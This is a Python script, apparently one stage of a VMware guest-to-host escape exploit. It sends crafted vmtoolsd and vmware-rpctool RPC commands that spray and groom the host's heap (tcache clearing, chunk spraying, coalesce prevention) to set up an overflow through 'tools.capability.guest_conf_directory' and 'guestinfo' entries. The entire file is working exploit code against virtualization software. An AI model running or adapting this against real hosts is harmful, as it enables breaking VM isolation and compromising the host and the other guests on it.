import os, sys, time

# clear out the values we've set before, in stage 1
os.system("vmware-rpctool 'tools.capability.guest_conf_directory A' > /dev/null")

# clear out the 0x2e0 tcache bin (which can only contain 7 elements)
for x in xrange(7):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop 000000000000%04x%s'" % (x, "P"*0x2c0))

# do an initial info-get to free stuff
os.system("vmtoolsd --cmd 'info-get guestinfo.bla2.koadskfopaopsdkfopasokdpf ' >/dev/null")

# initial spray to make a bunch of 0x60 size chunks
for x in xrange(0x100):
    os.system("vmtoolsd --cmd 'info-set guestinfo.bla2.spras%04x %s' >/dev/null" % (x, "x"*0x48))

# initial spray to level out the heap
for x in xrange(0xc0):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop TWOTWOTWOTWO%04x%s' > /dev/null" % (x, "B"*0x7F0))

# create a chunk in thread heap
os.system("vmware-rpctool 'info-set guestinfo.bla2.spray0001 %s' >/dev/null" % ("b"*0x14b0))
os.system("vmware-rpctool 'info-set guestinfo.bla2.spray0002 %s' >/dev/null" % ("c"*0x11d0))
os.system("vmware-rpctool 'info-set guestinfo.bla2.spray0003 %s' >/dev/null" % ("d"*0x2d0))

# get it onto main heap to spray one victim we can free at will
os.system("vmtoolsd --cmd 'info-get guestinfo.bla2.spray0001' >/dev/null")

# strategically prevent coalesce
for x in xrange(0x5):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop coalescepre3%04x%s' > /dev/null" % (x, "B"*0x23F0))

for x in xrange(0x100):
    os.system("vmtoolsd --cmd 'vmx.capability.unified_loop bbbbbbbbbbbb%04x%s' > /dev/null" % (x, "B"*0xD0))

# copy the second chunk over, creating our chunk followed by a chunk of size 0x310 on the tcache
time.sleep(5)
os.system("vmtoolsd --cmd 'info-get guestinfo.bla2.spray0002'")

time.sleep(5)
os.system("vmtoolsd --cmd 'tools.capability.guest_conf_directory %sABABABABABABABABABABABAB' > /dev/null" % ("Q"*0x2b0))

# create the extra chunk for our overflow
os.system("vmtoolsd --cmd 'tools.capability.guest_conf_directory %s' > /dev/null" % ("Q"*0x1100))
os.system("vmtoolsd --cmd 'info-get guestinfo.none-existent' 2>/dev/null")
